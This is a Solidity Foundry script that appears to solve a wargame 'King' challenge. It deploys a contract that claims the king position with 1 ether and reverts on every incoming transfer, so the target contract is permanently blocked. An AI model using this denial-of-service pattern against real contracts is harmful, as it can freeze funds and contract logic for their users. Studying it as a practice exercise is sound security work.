// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";

contract KingAttack is Script {
    address payable kingContractAddress = payable(0xYourKingInstanceAddressHere); // Replace with the actual instance address

    function run() external {
        // Start broadcasting the transaction
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the malicious contract and send enough Ether to become king
        KingAttacker attacker = new KingAttacker{value: 1 ether}(kingContractAddress);

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}

// Malicious contract that becomes king and blocks any further transfers by reverting on receiving Ether
contract KingAttacker {
    address payable kingContract;

    // Constructor receives the address of the King contract and sends Ether to claim the throne
    constructor(address payable _kingContract) payable {
        kingContract = _kingContract;
        (bool success,) = kingContract.call{value: msg.value}(""); // Call to claim the king position
        require(success, "Failed to become king");
    }

    // This fallback function ensures that any Ether transfer to this contract will fail
    receive() external payable {
        revert("I refuse to accept Ether and block further kingship.");
    }
}